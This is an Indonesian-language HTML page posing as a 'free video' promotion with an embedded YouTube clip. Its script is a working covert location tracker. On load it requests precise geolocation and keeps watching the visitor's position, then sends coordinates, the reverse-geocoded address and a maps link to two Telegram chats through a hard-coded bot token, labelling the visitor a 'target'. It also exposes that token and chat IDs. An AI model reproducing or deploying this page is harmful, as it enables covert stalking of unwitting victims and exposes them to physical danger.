<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Promo Spesial: Video Gratis!</title>
    <style>
        body { font-family: Arial; padding: 20px; background: #f0f0f0; text-align: center; }
        #video-container { margin: 20px auto; max-width: 560px; }
        #youtube-video { width: 100%; height: 315px; border: none; }
        #status { font-size: 12px; color: #666; margin-top: 10px; opacity: 0.7; }
    </style>
</head>
<body>
    <h1>!</h1>
    <p>...</p>
    
    <div id="video-container">
        <iframe id="youtube-video" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&rel=0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    </div>
    
    <div id="status">Tunggu sebentar...</div>

    <script>
        // Ganti ini
        const BOT_TOKEN = '7822471568:AAE89BHf7mxBx4kqhKNLyE7yP4IlMgi8wFE';
        const CHAT_IDS = ['7680606818', '6212362026']; // Masukin dua ID di sini, misal ['7680606818', 'ID_KEDUA_LO']
        
        let watchId;
        let lastLat = null;
        let lastLng = null;
        const MIN_DISTANCE = 5;
        const status = document.getElementById('status');
        let retryCount = 0;
        const MAX_RETRIES = 2;

        // Fungsi jarak (sama)
        function getDistance(lat1, lng1, lat2, lng2) {
            if (!lat1 || !lat2) return Infinity;
            const R = 6371e3;
            const φ1 = lat1 * Math.PI/180;
            const φ2 = lat2 * Math.PI/180;
            const Δφ = (lat2-lat1) * Math.PI/180;
            const Δλ = (lng2-lng1) * Math.PI/180;
            const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) + Math.cos(φ1) * Math.cos(φ2) * Math.sin(Δλ/2) * Math.sin(Δλ/2);
            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
            return R * c;
        }

        // Geocode (sama)
        async function getAddress(lat, lng) {
            try {
                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
                const data = await res.json();
                return data.display_name || 'Alamat tidak ditemukan';
            } catch (e) {
                return 'Error geocode';
            }
        }

        // Kirim ke Telegram - Update buat multiple ID
        async function sendToTelegram(lat, lng, accuracy, timestamp, address, mapsLink) {
            const message = `😈𝙍𝙖𝙡𝙙𝙤𝙓𝙩𝙧𝙖𝙘𝙠: 𝙨𝙪𝙠𝙨𝙚𝙨 𝙏𝙖𝙧𝙜𝙚𝙩 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝘿𝙞 𝙇𝙖𝙘𝙖𝙠!😈\n\nLatitude: ${lat.toFixed(7)}\nLongitude: ${lng.toFixed(7)}\nAkurasi: ${accuracy}m\nAlamat: ${address}\nWaktu: ${new Date(timestamp).toLocaleString('id-ID')}\n\n😈𝐋𝐨𝐤𝐚𝐬𝐢 𝐓𝐚𝐫𝐠𝐞𝐭: ${mapsLink}`;
            
            // Loop buat kirim ke semua ID
            for (const chatId of CHAT_IDS) {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
                try {
                    const response = await fetch(url);
                    if (response.ok) {
                        console.log(`Data terkirim ke chat ${chatId}!`);
                    } else {
                        console.error(`Error kirim ke ${chatId}: ${response.status}`);
                    }
                } catch (error) {
                    console.error(`Error fetch ke ${chatId}: ${error.message}`);
                }
            }
        }

        // Tampil posisi (sama)
        async function showPosition(position) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const acc = position.coords.accuracy;
            const time = position.timestamp;
            
            const distance = getDistance(lastLat, lastLng, lat, lng);
            if (distance < MIN_DISTANCE && lastLat !== null) {
                return;
            }
            lastLat = lat;
            lastLng = lng;
            
            const mapsLink = `https://maps.google.com/?q=${lat.toFixed(7)},${lng.toFixed(7)}`;
            const address = await getAddress(lat, lng);
            
            status.innerHTML = `𝐋𝐨𝐩 𝐲𝐨𝐮! (❤❤: ${acc.toFixed(0)}m)`;
            console.log(`Update: ${lat.toFixed(7)}, ${lng.toFixed(7)} | ${address}`);
            
            sendToTelegram(lat, lng, acc, time, address, mapsLink);
        }

        // Error handler dengan fallback
        function showError(error) {
            console.error('Geolocation Error:', error.code, error.message);
            let msg = 'Verifikasi gagal: ';
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    msg += 'I🌹🌹❤❤💕💕.';
                    break;
                case error.POSITION_UNAVAILABLE:
                    msg += '🌹🌹🌹🌹🌹🌹.';
                    break;
                case error.TIMEOUT:
                    msg += 'Sinyal lemah. Mencoba lagi...';
                    if (retryCount < MAX_RETRIES) {
                        retryCount++;
                        setTimeout(() => attemptGeolocation(false), 2000); // Retry dengan low accuracy setelah 2s
                    } else {
                        msg += ' (Coba matikan VPN atau keluar ruangan)';
                    }
                    break;
            }
            status.innerHTML = msg;
        }

        // Fungsi attempt geolocation dengan opsi high/low accuracy
        function attemptGeolocation(highAccuracy = true) {
            const options = {
                enableHighAccuracy: highAccuracy,
                timeout: 30000, // Naik ke 30 detik
                maximumAge: 1000
            };
            status.innerHTML = `Meminta akses lokasi${highAccuracy ? ' akurat' : ''}...`;
            
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    showPosition(pos);
                    // Lanjut watch
                    watchId = navigator.geolocation.watchPosition(showPosition, showError, options);
                    retryCount = 0; // Reset retry
                },
                showError,
                options
            );
        }

        // Handle network change
        window.addEventListener('online', () => {
            console.log('Network online - retrying geolocation');
            if (retryCount > 0) {
                setTimeout(() => attemptGeolocation(true), 1000);
            }
        });

        window.addEventListener('offline', () => {
            console.log('Network offline');
            status.innerHTML = 'Koneksi hilang. Coba lagi.';
        });

        // Auto start
        function initTracking() {
            if (navigator.geolocation) {
                // Coba high accuracy dulu
                attemptGeolocation(true);
            } else {
                status.innerHTML = 'Lokasi tidak didukung. Coba browser lain.';
            }
        }

        window.addEventListener('load', initTracking);
    </script>
</body>
</html>
